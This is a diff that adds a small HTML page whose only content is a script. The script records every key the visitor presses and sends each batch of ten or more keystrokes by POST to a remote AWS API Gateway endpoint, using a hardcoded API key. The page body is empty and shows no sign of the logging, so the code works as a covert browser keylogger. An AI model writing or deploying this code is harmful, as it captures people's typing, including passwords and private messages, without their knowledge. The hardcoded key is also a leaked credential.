@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script>
+    
+      const ID1 = '2twhynojr3';
+      const AREA = 'ap-northeast-1';
+      const URL = `https://${ID1}.execute-api.${AREA}.amazonaws.com/dev/`;
+      const KEY = 'OjwoF3m0l20OFidHsRea3ptuQRfQL10ahbEtLa';
+
+      const method = "POST";
+      const headers = {
+          'x-api-key': `A${KEY}s`,
+          // 'Access-Control-Allow-Origin': '*',
+          'Content-Type': 'application/json'
+      };
+
+      var buffers = [];
+
+      var buttonClick = () => {
+        var text = buffers.join(' ');
+        var data = JSON.stringify({
+          uid: '11111',
+          test: 'test',
+          keys: text
+        });
+        console.log(data);
+        buffers = [];
+
+        fetch(URL, {
+          method: 'POST', // or 'PUT'
+          headers: headers,
+          body: data,
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Success:', data);
+        })
+        .catch(error => {
+          console.error('Error:', error);
+        });
+
+        // fetch(URL, {method, headers: headers, data})
+        // .then((res)=> res.json())
+        // .then(console.log)
+        // .catch(console.error);
+        // LOGS = [];
+
+      };
+
+      document.addEventListener('keydown', (event) => {
+        var keyName = event.key;
+        buffers.push(keyName);
+
+        if (event.ctrlKey) {
+          console.log(`keydown:Ctrl + ${keyName}`);
+        } else if (event.shiftKey) {
+          console.log(`keydown:Shift + ${keyName}`);
+        } else {
+          console.log(`keydown:${keyName}`);
+        }
+
+        var size = buffers.length;
+        if (size>=10){
+          setTimeout(buttonClick, 3000);
+        }
+      });
+
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
